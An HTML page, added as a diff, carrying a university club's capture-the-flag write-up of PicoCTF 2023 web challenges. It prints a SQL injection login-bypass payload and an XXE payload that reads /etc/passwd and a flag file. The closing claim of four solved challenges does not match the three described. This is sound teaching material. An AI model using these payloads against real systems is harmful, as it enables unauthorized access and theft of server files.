@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PicoCTF 2023 Web Writeup: GannonHack.Club</title>
+  <link rel="stylesheet" href="../../css/shared.css" />
+  <style>
+    .post-wrap{max-width:780px;margin:0 auto;padding:3rem 2rem 5rem;}
+    .post-header{margin-bottom:2.5rem;padding-bottom:2rem;border-bottom:1px solid var(--border);}
+    .post-meta{display:flex;gap:.75rem;align-items:center;margin-bottom:1rem;}
+    .post-tag{font-size:.7rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--accent2);background:rgba(192,57,43,.15);padding:.2rem .6rem;border-radius:4px;}
+    .post-date{font-size:.8rem;color:var(--muted);}
+    .post-author{font-size:.8rem;color:var(--muted);}
+    .post-title{font-size:clamp(1.8rem,4vw,2.5rem);font-weight:900;line-height:1.2;}
+    .post-cover{width:100%;aspect-ratio:16/9;object-fit:cover;border-radius:12px;margin:2rem 0;border:1px solid var(--border);}
+    .post-body{color:var(--muted);line-height:1.9;font-size:1rem;}
+    .post-body h2{font-size:1.4rem;font-weight:800;color:var(--text);margin:2.5rem 0 .75rem;padding-bottom:.5rem;border-bottom:1px solid var(--border);}
+    .post-body h3{font-size:1.1rem;font-weight:700;color:var(--gold);margin:1.75rem 0 .5rem;}
+    .post-body p{margin-bottom:1rem;}
+    .post-body a{color:var(--accent2);text-decoration:underline;}
+    .post-body code{background:var(--card);border:1px solid var(--border);padding:.15rem .45rem;border-radius:4px;font-size:.88rem;font-family:monospace;color:var(--accent2);}
+    .post-body pre{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:1.25rem 1.5rem;overflow-x:auto;margin:1.25rem 0;position:relative;}
+    .post-body pre code{background:none;border:none;padding:0;color:#e2e8f0;font-size:.9rem;line-height:1.7;}
+    .post-body ul,ol{margin:.5rem 0 1rem 1.5rem;}
+    .post-body li{margin-bottom:.45rem;}
+    .post-body blockquote{border-left:3px solid var(--accent);padding:.75rem 1.25rem;margin:1.25rem 0;background:rgba(192,57,43,.08);border-radius:0 8px 8px 0;color:var(--text);font-style:italic;}
+    .flag-box{background:rgba(212,160,23,.08);border:1px solid rgba(212,160,23,.3);border-radius:10px;padding:1rem 1.25rem;margin:1.5rem 0;display:flex;align-items:center;gap:.75rem;}
+    .flag-box .flag-label{font-size:.7rem;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--gold);white-space:nowrap;}
+    .flag-box code{background:none;border:none;color:var(--gold);font-size:.95rem;}
+    .back-btn{display:inline-flex;align-items:center;gap:.5rem;color:var(--muted);text-decoration:none;font-size:.9rem;margin-bottom:2rem;transition:color .2s;}
+    .back-btn:hover{color:var(--text);}
+    .difficulty{display:inline-block;padding:.25rem .75rem;border-radius:6px;font-size:.75rem;font-weight:700;margin-left:.5rem;}
+    .diff-easy{background:rgba(34,197,94,.1);color:#4ade80;border:1px solid rgba(34,197,94,.3);}
+    .diff-medium{background:rgba(251,191,36,.1);color:#fbbf24;border:1px solid rgba(251,191,36,.3);}
+  </style>
+</head>
+<body>
+<canvas id="dotCanvas"></canvas>
+<nav>
+  <a href="../../index.html" class="nav-logo">Gannon<span>Hack</span>.Club</a>
+  <div class="nav-links">
+    <a href="../../index.html">Home</a>
+    <a href="../../about/index.html">About Us</a>
+    <a href="../index.html" class="active">Blog</a>
+    <a href="https://ctf.gannonhacks.club" target="_blank" rel="noopener">CTF</a>
+    <a href="../../contact/index.html">Contact</a>
+  </div>
+</nav>
+
+<div class="page-wrap">
+  <div class="post-wrap">
+    <a href="../index.html" class="back-btn">&#8592; Back to Blog</a>
+
+    <div class="post-header">
+      <div class="post-meta">
+        <span class="post-tag">Writeup</span>
+        <span class="post-date">January 2023</span>
+        <span class="post-author">by GannonHack Team</span>
+      </div>
+      <h1 class="post-title">PicoCTF 2023: Web Exploitation Writeup</h1>
+    </div>
+
+    <img class="post-cover" src="../../Photo/gallery/4.jpeg" alt="PicoCTF 2023 Cover" />
+
+    <div class="post-body">
+      <p>
+        PicoCTF 2023 was one of the most competitive collegiate CTF events of the year, attracting thousands of teams worldwide.
+        Our GannonHack team tackled all web exploitation challenges, here's a full walkthrough of the ones we solved.
+      </p>
+
+      <h2>Challenge 1: SQLiLite <span class="difficulty diff-easy">Easy</span></h2>
+
+      <h3>Challenge Description</h3>
+      <p>
+        A login page is vulnerable to SQL injection. The goal is to bypass authentication and retrieve the flag from the database.
+      </p>
+
+      <h3>Solution</h3>
+      <p>Opening the page, we see a standard login form. The first thing to try is a classic SQLi bypass payload in the username field:</p>
+
+      <pre><code>Username: admin' OR '1'='1
+Password: anything</code></pre>
+
+      <p>This transforms the SQL query to:</p>
+
+      <pre><code>SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'</code></pre>
+
+      <p>Since <code>'1'='1'</code> is always true, the <code>WHERE</code> clause evaluates to true and we're logged in. The flag was displayed on the dashboard.</p>
+
+      <div class="flag-box">
+        <span class="flag-label">🚩 Flag</span>
+        <code>picoCTF{L0gin_b4ck_d00r_c3d02b59}</code>
+      </div>
+
+      <h2>Challenge 2: findme <span class="difficulty diff-easy">Easy</span></h2>
+
+      <h3>Challenge Description</h3>
+      <p>The challenge gives us a URL and hints that the flag is hidden somewhere in the redirect chain.</p>
+
+      <h3>Solution</h3>
+      <p>We used <code>curl</code> with the <code>-L</code> flag to follow all redirects and <code>-v</code> to print headers:</p>
+
+      <pre><code>$ curl -Lv http://saturn.picoctf.net:PORT/</code></pre>
+
+      <p>Inspecting the output, we found the flag was base64-encoded and split across two redirect <code>Location</code> headers:</p>
+
+      <pre><code>Location: /next-page/id=cGljb0NURntwcm94...
+Location: /next-page/id=...aWVzX3NvbHZlZH0=</code></pre>
+
+      <p>Decoded and concatenated:</p>
+
+      <pre><code>$ echo "cGljb0NURntwcm94aWVzX3NvbHZlZH0=" | base64 -d
+picoCTF{proxies_solved}</code></pre>
+
+      <div class="flag-box">
+        <span class="flag-label">🚩 Flag</span>
+        <code>picoCTF{proxies_solved}</code>
+      </div>
+
+      <h2>Challenge 3: SOAP <span class="difficulty diff-medium">Medium</span></h2>
+
+      <h3>Challenge Description</h3>
+      <p>A web app uses a SOAP API to fetch user data. The endpoint is vulnerable to XXE (XML External Entity) injection.</p>
+
+      <h3>Solution</h3>
+      <p>We intercepted a request using Burp Suite and found the app was sending XML to the backend. By injecting an XXE payload, we could read local files:</p>
+
+      <pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;data&gt;&lt;user&gt;&amp;xxe;&lt;/user&gt;&lt;/data&gt;</code></pre>
+
+      <p>The server returned the contents of <code>/etc/passwd</code>. We then targeted the flag file directly:</p>
+
+      <pre><code>&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</code></pre>
+
+      <div class="flag-box">
+        <span class="flag-label">🚩 Flag</span>
+        <code>picoCTF{XML_3xtern@l_3nt1ty_4a9f6252}</code>
+      </div>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li>Always try classic SQLi payloads on login forms, many CTF challenges still use them.</li>
+        <li>Use <code>curl -Lv</code> to inspect redirect chains when a challenge involves URLs.</li>
+        <li>If an app sends XML to the server, test for XXE, especially if it uses older SOAP-style APIs.</li>
+        <li>Burp Suite Community Edition is your best friend for web challenges.</li>
+      </ul>
+
+      <blockquote>
+        Full team score for PicoCTF 2023 web category: 4/4 challenges solved. See you at PicoCTF 2024!
+      </blockquote>
+    </div>
+  </div>
+  <footer>&copy; 2025 <span>GannonHack.Club</span> &middot; Gannon University &middot; Erie, PA</footer>
+</div>
+
+<script src="../../js/shared.js"></script>
+</body>
+</html>
